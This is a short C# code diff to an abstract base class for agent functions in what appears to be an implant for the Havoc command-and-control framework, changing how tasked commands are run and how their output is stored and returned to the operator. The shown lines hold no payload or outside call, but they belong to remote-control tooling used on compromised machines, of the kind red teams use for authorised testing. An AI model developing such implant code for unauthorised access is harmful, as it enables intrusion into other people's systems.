@@ -1,9 +1,5 @@
-﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
-using static HavocImplant.Implant;
+﻿using HavocImplant.Communications;
+using System;
 
 namespace HavocImplant.AgentFunctions
 {
@@ -20,11 +16,17 @@ namespace HavocImplant.AgentFunctions
             Agent = agent;
         }
 
-        public abstract void Run(string command, int taskId);
+        public abstract void Run(int taskId);
         public void ReturnOutput(int taskId)
         {
-            Agent.taskingInformation[taskId] = new Implant.task(Agent.taskingInformation[taskId].taskCommand, ($"[+] Output for [{Agent.taskingInformation[taskId].taskCommand}]\n" + Output).Replace("\\", "\\\\").Replace("\"", "\\\""));
-
+            // We cannot modify an index cause its no variable, so we must make new item
+            Agent.taskingInformation[taskId] = new Implant.task {
+                taskCommand = Agent.taskingInformation[taskId].taskCommand,
+                taskArguments = Agent.taskingInformation[taskId].taskArguments,
+                taskFile = Agent.taskingInformation[taskId].taskFile,
+                taskOutput = Utils.CleanString($"[+] Output for [{Agent.taskingInformation[taskId].taskCommand}]\n" + Output)
+            };
+            Console.WriteLine(Agent.taskingInformation[taskId].taskOutput);
         }
     }
 }
